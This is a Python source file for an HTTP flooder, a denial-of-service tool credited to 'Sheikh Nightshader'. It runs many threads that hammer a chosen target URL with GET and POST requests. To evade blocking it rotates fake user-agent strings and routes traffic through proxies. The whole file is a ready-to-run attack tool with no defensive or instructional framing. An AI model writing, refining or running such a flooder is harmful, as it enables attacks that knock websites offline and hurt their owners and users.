import requests
import argparse
import threading
import random
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from fake_useragent import UserAgent

class Colors:
    SUCCESS = '\033[92m'
    FAILURE = '\033[91m'
    INFO = '\033[93m'
    BANNER = '\033[94m'
    RESET = '\033[0m'

banner = f"""
{Colors.BANNER}
        +-+-+-+-+ +-+-+-+-+-+
        |H|T|T|P| |F|l|o|o|d|
        +-+-+-+-+ +-+-+-+-+-+
=======================================
    HTTP Flooder Script
    Created by Sheikh Nightshader
=======================================
{Colors.RESET}
"""

print(banner)

parser = argparse.ArgumentParser(description='HTTP Flooder Script')
parser.add_argument('--url', required=True, help='Target URL to flood')
parser.add_argument('--threads', type=int, default=50, help='Number of threads (default: 50)')
parser.add_argument('--rate', type=int, default=10, help='Requests per second per thread (default: 10)')
parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
parser.add_argument('--log', action='store_true', help='Enable response logging')
parser.add_argument('--proxies', type=str, help='Comma-separated list of proxy URLs')
parser.add_argument('--methods', type=str, default='GET', help='Comma-separated list of HTTP methods (default: GET)')
args = parser.parse_args()

target_url = args.url
num_threads = args.threads
request_rate = args.rate
timeout = args.timeout
log_responses = args.log
proxy_list = args.proxies.split(',') if args.proxies else []
http_methods = args.methods.split(',')

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Edge/18.18363",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"
]

def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def http_flood(stop_event):
    session = create_session()
    while not stop_event.is_set():
        try:
            method = random.choice(http_methods)
            headers = {'User-Agent': random.choice(user_agents)}
            proxies = {'http': random.choice(proxy_list) if proxy_list else None,
                       'https': random.choice(proxy_list) if proxy_list else None}

            if method == 'GET':
                response = session.get(target_url, headers=headers, proxies=proxies, timeout=timeout)
            elif method == 'POST':
                response = session.post(target_url, headers=headers, proxies=proxies, timeout=timeout)
            else:
                print(f"{Colors.FAILURE}Unsupported HTTP method: {method}{Colors.RESET}")
                continue

            log_message = f"Sent {method} request to {target_url}. Status: {response.status_code}"
            print(f"{Colors.SUCCESS}{log_message}{Colors.RESET}")
            if log_responses:
                with open('responses.log', 'a') as log_file:
                    log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {log_message}\n")
            time.sleep(1 / request_rate)
        except requests.RequestException as e:
            print(f"{Colors.FAILURE}Error: {e}{Colors.RESET}")

def main():
    print(f"{Colors.INFO}URL: {target_url}{Colors.RESET}")
    print(f"{Colors.INFO}Threads: {num_threads}{Colors.RESET}")
    print(f"{Colors.INFO}Rate: {request_rate} requests/second/thread{Colors.RESET}")
    print(f"{Colors.INFO}Timeout: {timeout}s{Colors.RESET}")
    if log_responses:
        print(f"{Colors.INFO}Logging responses to responses.log{Colors.RESET}")
    if proxy_list:
        print(f"{Colors.INFO}Proxies: {', '.join(proxy_list)}{Colors.RESET}")
    if http_methods:
        print(f"{Colors.INFO}Methods: {', '.join(http_methods)}{Colors.RESET}")

    stop_event = threading.Event()
    threads = [threading.Thread(target=http_flood, args=(stop_event,)) for _ in range(num_threads)]
    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"{Colors.INFO}\nStopping flood...{Colors.RESET}")
        stop_event.set()
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
